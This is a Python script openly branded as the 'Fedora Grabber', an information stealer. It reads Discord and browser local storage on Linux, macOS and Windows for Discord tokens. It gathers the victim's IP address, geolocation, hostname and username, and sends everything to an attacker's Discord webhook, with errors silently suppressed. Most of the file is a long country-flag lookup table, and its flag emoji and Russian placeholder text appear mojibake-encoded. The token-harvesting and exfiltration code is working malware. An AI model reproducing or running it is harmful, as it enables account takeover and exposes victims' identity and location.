#!/usr/bin/python3

WEBHOOK_URL = 'Ğ¢ÑƒÑ‚ Ğ±ÑƒĞ´ĞµÑ‚ Ğ²ĞµĞ±Ñ…ÑƒĞº URL'

from platform import system


def find_tokens(path):
    path += '/Local Storage/leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def search_tokens(ping_me_on_find_token = False, *any: any):

    # Token grabber for Linux by
    # https://github.com/wodxgod/Discord-Token-Grabber/pull/45#issuecomment-998310212

    if ping_me_on_find_token != True:
        ping_me_on_find_token = False
    else:
        ping_me_on_find_token = True
    ping = ping_me_on_find_token
    config = os.path.expanduser('~/.config')
    flatpak = os.path.expanduser('~/.var/app')
    get_os = str(system()).lower()

    if get_os == 'linux':
        paths = {
            'Discord': config + '/discord',
            'Discord (Flatpak)': flatpak + '/com.discordapp.Discord/config/discord',
            'Discord Canary': config + '/discordcanary',
            'Discord PTB': config + '/discordptb',
            'Google Chrome': config + '/google-chrome/Default'
        }
    elif get_os == 'darwin':
        paths = {
            'Discord': '~/Library/Application Support/Discord',
            'Google Chrome': '~/Library/Application Support/Google Chrome'
        }
    elif get_os == 'windows':

        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '/Discord',
            'Discord Canary': roaming + '/discordcanary',
            'Discord PTB': roaming + '/discordptb',
            'Google Chrome': local + '/Google/Chrome/User Data/Default',
            'Opera': roaming + '/Opera Software/Opera Stable',
            'Brave': local + '/BraveSoftware/Brave-Browser/User Data/Default',
            'Yandex': local + '/Yandex/YandexBrowser/User Data/Default'
        }
    message = '@everyone' if ping else ''
    try:
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            message += f'\n`{str(platform)}` - '

            tokens = find_tokens(path)
            if len(tokens) > 0:
                for token in tokens:
                    message += f'||**{str(token)}**||\n'
            else:
                message += '||**Not found.**||\n'
    except BaseException:
        pass
    return message

def get_country_flag_emoji(country_code: str, *any: any):
    emoji = None
    country_code = str(country_code).upper()
    if country_code =='AD': return 'ğŸ‡¦ğŸ‡©';
    elif country_code =='AE': return 'ğŸ‡¦ğŸ‡ª';
    elif country_code =='AF': return 'ğŸ‡¦ğŸ‡«';
    elif country_code =='AG': return 'ğŸ‡¦ğŸ‡¬';
    elif country_code =='AI': return 'ğŸ‡¦ğŸ‡®';
    elif country_code =='AL': return 'ğŸ‡¦ğŸ‡±';
    elif country_code =='AM': return 'ğŸ‡¦ğŸ‡²';
    elif country_code =='AO': return 'ğŸ‡¦ğŸ‡´';
    elif country_code =='AQ': return 'ğŸ‡¦ğŸ‡¶';
    elif country_code =='AR': return 'ğŸ‡¦ğŸ‡·';
    elif country_code =='AS': return 'ğŸ‡¦ğŸ‡¸';
    elif country_code =='AT': return 'ğŸ‡¦ğŸ‡¹';
    elif country_code =='AU': return 'ğŸ‡¦ğŸ‡º';
    elif country_code =='AW': return 'ğŸ‡¦ğŸ‡¼';
    elif country_code =='AX': return 'ğŸ‡¦ğŸ‡½';
    elif country_code =='AZ': return 'ğŸ‡¦ğŸ‡¿';
    elif country_code =='BA': return 'ğŸ‡§ğŸ‡¦';
    elif country_code =='BB': return 'ğŸ‡§ğŸ‡§';
    elif country_code =='BD': return 'ğŸ‡§ğŸ‡©';
    elif country_code =='BE': return 'ğŸ‡§ğŸ‡ª';
    elif country_code =='BF': return 'ğŸ‡§ğŸ‡«';
    elif country_code =='BG': return 'ğŸ‡§ğŸ‡¬';
    elif country_code =='BH': return 'ğŸ‡§ğŸ‡­';
    elif country_code =='BI': return 'ğŸ‡§ğŸ‡®';
    elif country_code =='BJ': return 'ğŸ‡§ğŸ‡¯';
    elif country_code =='BL': return 'ğŸ‡§ğŸ‡±';
    elif country_code =='BM': return 'ğŸ‡§ğŸ‡²';
    elif country_code =='BN': return 'ğŸ‡§ğŸ‡³';
    elif country_code =='BO': return 'ğŸ‡§ğŸ‡´';
    elif country_code =='BQ': return 'ğŸ‡§ğŸ‡¶';
    elif country_code =='BR': return 'ğŸ‡§ğŸ‡·';
    elif country_code =='BS': return 'ğŸ‡§ğŸ‡¸';
    elif country_code =='BT': return 'ğŸ‡§ğŸ‡¹';
    elif country_code =='BV': return 'ğŸ‡§ğŸ‡»';
    elif country_code =='BW': return 'ğŸ‡§ğŸ‡¼';
    elif country_code =='BY': return 'ğŸ‡§ğŸ‡¾';
    elif country_code =='BZ': return 'ğŸ‡§ğŸ‡¿';
    elif country_code =='CA': return 'ğŸ‡¨ğŸ‡¦';
    elif country_code =='CC': return 'ğŸ‡¨ğŸ‡¨';
    elif country_code =='CD': return 'ğŸ‡¨ğŸ‡©';
    elif country_code =='CF': return 'ğŸ‡¨ğŸ‡«';
    elif country_code =='CG': return 'ğŸ‡¨ğŸ‡¬';
    elif country_code =='CH': return 'ğŸ‡¨ğŸ‡­';
    elif country_code =='CI': return 'ğŸ‡¨ğŸ‡®';
    elif country_code =='CK': return 'ğŸ‡¨ğŸ‡°';
    elif country_code =='CL': return 'ğŸ‡¨ğŸ‡±';
    elif country_code =='CM': return 'ğŸ‡¨ğŸ‡²';
    elif country_code =='CN': return 'ğŸ‡¨ğŸ‡³';
    elif country_code =='CO': return 'ğŸ‡¨ğŸ‡´';
    elif country_code =='CR': return 'ğŸ‡¨ğŸ‡·';
    elif country_code =='CU': return 'ğŸ‡¨ğŸ‡º';
    elif country_code =='CV': return 'ğŸ‡¨ğŸ‡»';
    elif country_code =='CW': return 'ğŸ‡¨ğŸ‡¼';
    elif country_code =='CX': return 'ğŸ‡¨ğŸ‡½';
    elif country_code =='CY': return 'ğŸ‡¨ğŸ‡¾';
    elif country_code =='CZ': return 'ğŸ‡¨ğŸ‡¿';
    elif country_code =='DE': return 'ğŸ‡©ğŸ‡ª';
    elif country_code =='DJ': return 'ğŸ‡©ğŸ‡¯';
    elif country_code =='DK': return 'ğŸ‡©ğŸ‡°';
    elif country_code =='DM': return 'ğŸ‡©ğŸ‡²';
    elif country_code =='DO': return 'ğŸ‡©ğŸ‡´';
    elif country_code =='DZ': return 'ğŸ‡©ğŸ‡¿';
    elif country_code =='EC': return 'ğŸ‡ªğŸ‡¨';
    elif country_code =='EE': return 'ğŸ‡ªğŸ‡ª';
    elif country_code =='EG': return 'ğŸ‡ªğŸ‡¬';
    elif country_code =='EH': return 'ğŸ‡ªğŸ‡­';
    elif country_code =='ER': return 'ğŸ‡ªğŸ‡·';
    elif country_code =='ES': return 'ğŸ‡ªğŸ‡¸';
    elif country_code =='ET': return 'ğŸ‡ªğŸ‡¹';
    elif country_code =='FI': return 'ğŸ‡«ğŸ‡®';
    elif country_code =='FJ': return 'ğŸ‡«ğŸ‡¯';
    elif country_code =='FK': return 'ğŸ‡«ğŸ‡°';
    elif country_code =='FM': return 'ğŸ‡«ğŸ‡²';
    elif country_code =='FO': return 'ğŸ‡«ğŸ‡´';
    elif country_code =='FR': return 'ğŸ‡«ğŸ‡·';
    elif country_code =='GA': return 'ğŸ‡¬ğŸ‡¦';
    elif country_code =='GB': return 'ğŸ‡¬ğŸ‡§';
    elif country_code =='GD': return 'ğŸ‡¬ğŸ‡©';
    elif country_code =='GE': return 'ğŸ‡¬ğŸ‡ª';
    elif country_code =='GF': return 'ğŸ‡¬ğŸ‡«';
    elif country_code =='GG': return 'ğŸ‡¬ğŸ‡¬';
    elif country_code =='GH': return 'ğŸ‡¬ğŸ‡­';
    elif country_code =='GI': return 'ğŸ‡¬ğŸ‡®';
    elif country_code =='GL': return 'ğŸ‡¬ğŸ‡±';
    elif country_code =='GM': return 'ğŸ‡¬ğŸ‡²';
    elif country_code =='GN': return 'ğŸ‡¬ğŸ‡³';
    elif country_code =='GP': return 'ğŸ‡¬ğŸ‡µ';
    elif country_code =='GQ': return 'ğŸ‡¬ğŸ‡¶';
    elif country_code =='GR': return 'ğŸ‡¬ğŸ‡·';
    elif country_code =='GS': return 'ğŸ‡¬ğŸ‡¸';
    elif country_code =='GT': return 'ğŸ‡¬ğŸ‡¹';
    elif country_code =='GU': return 'ğŸ‡¬ğŸ‡º';
    elif country_code =='GW': return 'ğŸ‡¬ğŸ‡¼';
    elif country_code =='GY': return 'ğŸ‡¬ğŸ‡¾';
    elif country_code =='HK': return 'ğŸ‡­ğŸ‡°';
    elif country_code =='HM': return 'ğŸ‡­ğŸ‡²';
    elif country_code =='HN': return 'ğŸ‡­ğŸ‡³';
    elif country_code =='HR': return 'ğŸ‡­ğŸ‡·';
    elif country_code =='HT': return 'ğŸ‡­ğŸ‡¹';
    elif country_code =='HU': return 'ğŸ‡­ğŸ‡º';
    elif country_code =='ID': return 'ğŸ‡®ğŸ‡©';
    elif country_code =='IE': return 'ğŸ‡®ğŸ‡ª';
    elif country_code =='IL': return 'ğŸ‡®ğŸ‡±';
    elif country_code =='IM': return 'ğŸ‡®ğŸ‡²';
    elif country_code =='IN': return 'ğŸ‡®ğŸ‡³';
    elif country_code =='IO': return 'ğŸ‡®ğŸ‡´';
    elif country_code =='IQ': return 'ğŸ‡®ğŸ‡¶';
    elif country_code =='IR': return 'ğŸ‡®ğŸ‡·';
    elif country_code =='IS': return 'ğŸ‡®ğŸ‡¸';
    elif country_code =='IT': return 'ğŸ‡®ğŸ‡¹';
    elif country_code =='JE': return 'ğŸ‡¯ğŸ‡ª';
    elif country_code =='JM': return 'ğŸ‡¯ğŸ‡²';
    elif country_code =='JO': return 'ğŸ‡¯ğŸ‡´';
    elif country_code =='JP': return 'ğŸ‡¯ğŸ‡µ';
    elif country_code =='KE': return 'ğŸ‡°ğŸ‡ª';
    elif country_code =='KG': return 'ğŸ‡°ğŸ‡¬';
    elif country_code =='KH': return 'ğŸ‡°ğŸ‡­';
    elif country_code =='KI': return 'ğŸ‡°ğŸ‡®';
    elif country_code =='KM': return 'ğŸ‡°ğŸ‡²';
    elif country_code =='KN': return 'ğŸ‡°ğŸ‡³';
    elif country_code =='KP': return 'ğŸ‡°ğŸ‡µ';
    elif country_code =='KR': return 'ğŸ‡°ğŸ‡·';
    elif country_code =='KW': return 'ğŸ‡°ğŸ‡¼';
    elif country_code =='KY': return 'ğŸ‡°ğŸ‡¾';
    elif country_code =='KZ': return 'ğŸ‡°ğŸ‡¿';
    elif country_code =='LA': return 'ğŸ‡±ğŸ‡¦';
    elif country_code =='LB': return 'ğŸ‡±ğŸ‡§';
    elif country_code =='LC': return 'ğŸ‡±ğŸ‡¨';
    elif country_code =='LI': return 'ğŸ‡±ğŸ‡®';
    elif country_code =='LK': return 'ğŸ‡±ğŸ‡°';
    elif country_code =='LR': return 'ğŸ‡±ğŸ‡·';
    elif country_code =='LS': return 'ğŸ‡±ğŸ‡¸';
    elif country_code =='LT': return 'ğŸ‡±ğŸ‡¹';
    elif country_code =='LU': return 'ğŸ‡±ğŸ‡º';
    elif country_code =='LV': return 'ğŸ‡±ğŸ‡»';
    elif country_code =='LY': return 'ğŸ‡±ğŸ‡¾';
    elif country_code =='MA': return 'ğŸ‡²ğŸ‡¦';
    elif country_code =='MC': return 'ğŸ‡²ğŸ‡¨';
    elif country_code =='MD': return 'ğŸ‡²ğŸ‡©';
    elif country_code =='ME': return 'ğŸ‡²ğŸ‡ª';
    elif country_code =='MF': return 'ğŸ‡²ğŸ‡«';
    elif country_code =='MG': return 'ğŸ‡²ğŸ‡¬';
    elif country_code =='MH': return 'ğŸ‡²ğŸ‡­';
    elif country_code =='MK': return 'ğŸ‡²ğŸ‡°';
    elif country_code =='ML': return 'ğŸ‡²ğŸ‡±';
    elif country_code =='MM': return 'ğŸ‡²ğŸ‡²';
    elif country_code =='MN': return 'ğŸ‡²ğŸ‡³';
    elif country_code =='MO': return 'ğŸ‡²ğŸ‡´';
    elif country_code =='MP': return 'ğŸ‡²ğŸ‡µ';
    elif country_code =='MQ': return 'ğŸ‡²ğŸ‡¶';
    elif country_code =='MR': return 'ğŸ‡²ğŸ‡·';
    elif country_code =='MS': return 'ğŸ‡²ğŸ‡¸';
    elif country_code =='MT': return 'ğŸ‡²ğŸ‡¹';
    elif country_code =='MU': return 'ğŸ‡²ğŸ‡º';
    elif country_code =='MV': return 'ğŸ‡²ğŸ‡»';
    elif country_code =='MW': return 'ğŸ‡²ğŸ‡¼';
    elif country_code =='MX': return 'ğŸ‡²ğŸ‡½';
    elif country_code =='MY': return 'ğŸ‡²ğŸ‡¾';
    elif country_code =='MZ': return 'ğŸ‡²ğŸ‡¿';
    elif country_code =='NA': return 'ğŸ‡³ğŸ‡¦';
    elif country_code =='NC': return 'ğŸ‡³ğŸ‡¨';
    elif country_code =='NE': return 'ğŸ‡³ğŸ‡ª';
    elif country_code =='NF': return 'ğŸ‡³ğŸ‡«';
    elif country_code =='NG': return 'ğŸ‡³ğŸ‡¬';
    elif country_code =='NI': return 'ğŸ‡³ğŸ‡®';
    elif country_code =='NL': return 'ğŸ‡³ğŸ‡±';
    elif country_code =='NO': return 'ğŸ‡³ğŸ‡´';
    elif country_code =='NP': return 'ğŸ‡³ğŸ‡µ';
    elif country_code =='NR': return 'ğŸ‡³ğŸ‡·';
    elif country_code =='NU': return 'ğŸ‡³ğŸ‡º';
    elif country_code =='NZ': return 'ğŸ‡³ğŸ‡¿';
    elif country_code =='OM': return 'ğŸ‡´ğŸ‡²';
    elif country_code =='PA': return 'ğŸ‡µğŸ‡¦';
    elif country_code =='PE': return 'ğŸ‡µğŸ‡ª';
    elif country_code =='PF': return 'ğŸ‡µğŸ‡«';
    elif country_code =='PG': return 'ğŸ‡µğŸ‡¬';
    elif country_code =='PH': return 'ğŸ‡µğŸ‡­';
    elif country_code =='PK': return 'ğŸ‡µğŸ‡°';
    elif country_code =='PL': return 'ğŸ‡µğŸ‡±';
    elif country_code =='PM': return 'ğŸ‡µğŸ‡²';
    elif country_code =='PN': return 'ğŸ‡µğŸ‡³';
    elif country_code =='PR': return 'ğŸ‡µğŸ‡·';
    elif country_code =='PS': return 'ğŸ‡µğŸ‡¸';
    elif country_code =='PT': return 'ğŸ‡µğŸ‡¹';
    elif country_code =='PW': return 'ğŸ‡µğŸ‡¼';
    elif country_code =='PY': return 'ğŸ‡µğŸ‡¾';
    elif country_code =='QA': return 'ğŸ‡¶ğŸ‡¦';
    elif country_code =='RE': return 'ğŸ‡·ğŸ‡ª';
    elif country_code =='RO': return 'ğŸ‡·ğŸ‡´';
    elif country_code =='RS': return 'ğŸ‡·ğŸ‡¸';
    elif country_code =='RU': return 'ğŸ‡·ğŸ‡º';
    elif country_code =='RW': return 'ğŸ‡·ğŸ‡¼';
    elif country_code =='SA': return 'ğŸ‡¸ğŸ‡¦';
    elif country_code =='SB': return 'ğŸ‡¸ğŸ‡§';
    elif country_code =='SC': return 'ğŸ‡¸ğŸ‡¨';
    elif country_code =='SD': return 'ğŸ‡¸ğŸ‡©';
    elif country_code =='SE': return 'ğŸ‡¸ğŸ‡ª';
    elif country_code =='SG': return 'ğŸ‡¸ğŸ‡¬';
    elif country_code =='SH': return 'ğŸ‡¸ğŸ‡­';
    elif country_code =='SI': return 'ğŸ‡¸ğŸ‡®';
    elif country_code =='SJ': return 'ğŸ‡¸ğŸ‡¯';
    elif country_code =='SK': return 'ğŸ‡¸ğŸ‡°';
    elif country_code =='SL': return 'ğŸ‡¸ğŸ‡±';
    elif country_code =='SM': return 'ğŸ‡¸ğŸ‡²';
    elif country_code =='SN': return 'ğŸ‡¸ğŸ‡³';
    elif country_code =='SO': return 'ğŸ‡¸ğŸ‡´';
    elif country_code =='SR': return 'ğŸ‡¸ğŸ‡·';
    elif country_code =='SS': return 'ğŸ‡¸ğŸ‡¸';
    elif country_code =='ST': return 'ğŸ‡¸ğŸ‡¹';
    elif country_code =='SV': return 'ğŸ‡¸ğŸ‡»';
    elif country_code =='SX': return 'ğŸ‡¸ğŸ‡½';
    elif country_code =='SY': return 'ğŸ‡¸ğŸ‡¾';
    elif country_code =='SZ': return 'ğŸ‡¸ğŸ‡¿';
    elif country_code =='TC': return 'ğŸ‡¹ğŸ‡¨';
    elif country_code =='TD': return 'ğŸ‡¹ğŸ‡©';
    elif country_code =='TF': return 'ğŸ‡¹ğŸ‡«';
    elif country_code =='TG': return 'ğŸ‡¹ğŸ‡¬';
    elif country_code =='TH': return 'ğŸ‡¹ğŸ‡­';
    elif country_code =='TJ': return 'ğŸ‡¹ğŸ‡¯';
    elif country_code =='TK': return 'ğŸ‡¹ğŸ‡°';
    elif country_code =='TL': return 'ğŸ‡¹ğŸ‡±';
    elif country_code =='TM': return 'ğŸ‡¹ğŸ‡²';
    elif country_code =='TN': return 'ğŸ‡¹ğŸ‡³';
    elif country_code =='TO': return 'ğŸ‡¹ğŸ‡´';
    elif country_code =='TR': return 'ğŸ‡¹ğŸ‡·';
    elif country_code =='TT': return 'ğŸ‡¹ğŸ‡¹';
    elif country_code =='TV': return 'ğŸ‡¹ğŸ‡»';
    elif country_code =='TW': return 'ğŸ‡¹ğŸ‡¼';
    elif country_code =='TZ': return 'ğŸ‡¹ğŸ‡¿';
    elif country_code =='UA': return 'ğŸ‡ºğŸ‡¦';
    elif country_code =='UG': return 'ğŸ‡ºğŸ‡¬';
    elif country_code =='UM': return 'ğŸ‡ºğŸ‡²';
    elif country_code =='US': return 'ğŸ‡ºğŸ‡¸';
    elif country_code =='UY': return 'ğŸ‡ºğŸ‡¾';
    elif country_code =='UZ': return 'ğŸ‡ºğŸ‡¿';
    elif country_code =='VA': return 'ğŸ‡»ğŸ‡¦';
    elif country_code =='VC': return 'ğŸ‡»ğŸ‡¨';
    elif country_code =='VE': return 'ğŸ‡»ğŸ‡ª';
    elif country_code =='VG': return 'ğŸ‡»ğŸ‡¬';
    elif country_code =='VI': return 'ğŸ‡»ğŸ‡®';
    elif country_code =='VN': return 'ğŸ‡»ğŸ‡³';
    elif country_code =='VU': return 'ğŸ‡»ğŸ‡º';
    elif country_code =='WF': return 'ğŸ‡¼ğŸ‡«';
    elif country_code =='WS': return 'ğŸ‡¼ğŸ‡¸';
    elif country_code =='XK': return 'ğŸ‡½ğŸ‡°';
    elif country_code =='YE': return 'ğŸ‡¾ğŸ‡ª';
    elif country_code =='YT': return 'ğŸ‡¾ğŸ‡¹';
    elif country_code =='ZA': return 'ğŸ‡¿ğŸ‡¦';
    elif country_code == 'ZM': return 'ğŸ‡¿ğŸ‡²';
    return emoji

try:
    import re, os
    from requests import get
    from discord import Webhook, RequestsWebhookAdapter
    from platform import system as get_os
    from datetime import datetime
    from socket import gethostname
    from getpass import getuser as getusername
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    url = '<URL>'
    url = str(WEBHOOK_URL)

    ip = str(get('http://ipgrab.io').text).replace('\n','')
    location_data = get(f'http://ip-api.com/json/{str(ip)}').json()
    more_location_data = get(f'https://ipapi.co/{str(ip)}/json').json()
    more_location_data_2 = get(f'http://ipwhois.app/json/{str(ip)}').json()
    country = location_data['country']
    country_code = location_data['countryCode']
    city = location_data['city']
    region_name = location_data['regionName']
    zip_code = location_data['zip']
    lat = location_data['lat']
    lon = location_data['lon']
    timezone = location_data['timezone']
    country_flag = get_country_flag_emoji(country_code = country_code)
    country_calling_code = str(get('https://ipapi.co/country_calling_code').text)
    country_domain = more_location_data['country_tld']
    country_continent = more_location_data_2['continent']
    
    currency = more_location_data['currency']
    currency_name = more_location_data['currency_name']
    currency_symbol = more_location_data_2['currency_symbol']

    tokens = search_tokens()

    webhook = Webhook.from_url(str(url), adapter=RequestsWebhookAdapter())
    webhook.send(f'''
:boom: **Fedora Grabber** :boom:
*A cross platform IP, OS, etc. grabber made with Python 3.*
*By EZRAIDv2 with love :)*
**github.com/EZRAIDv2/fedora-grabber**

:map: **``Geolocation Info``** :globe_with_meridians:

`OS` - ||**{str(get_os())}**||
`IP` - ||**{str(ip)}**||
`Country` - ||**{str(country)}**||
`Country flag` - ||**{str(country_flag)}**||
`Country code` - ||**{str(country_code)}**||
`Country calling number` - ||**{str(country_calling_code)}**||
`Country domain` - ||**{str(country_domain)}**||
`Country continent` - ||**{str(country_continent)}**||
`Region` - ||**{str(region_name)}**||
`City` - ||**{str(city)}**||
`Latitudes` - ||**{str(lat)}**||
`Longitudes` - ||**{str(lon)}**||
`Timezone` - ||**{str(timezone)}**||
`ZIP Code (postal code)` - ||**{str(zip_code)}**||

:desktop: **``PC Info``** :computer:

`PC Hostname` - ||**{str(gethostname())}**||
`PC Username` - ||**{str(getusername())}**||

:clock3: **``Time Info``** :alarm_clock:

`Time` - ||**{str(current_time)}**||

:money_with_wings: **``Currency info``** :moneybag:

`Country currency` - ||**{str(currency)}**||
`Country currency (name)` - ||**{str(currency_name)}**||
`Country currency (symbol)` - ||**{str(currency_symbol)}**||

:clipboard: **`Discord tokens`** :page_facing_up:
{str(tokens)}
''')
except BaseException as e: print(e); pass
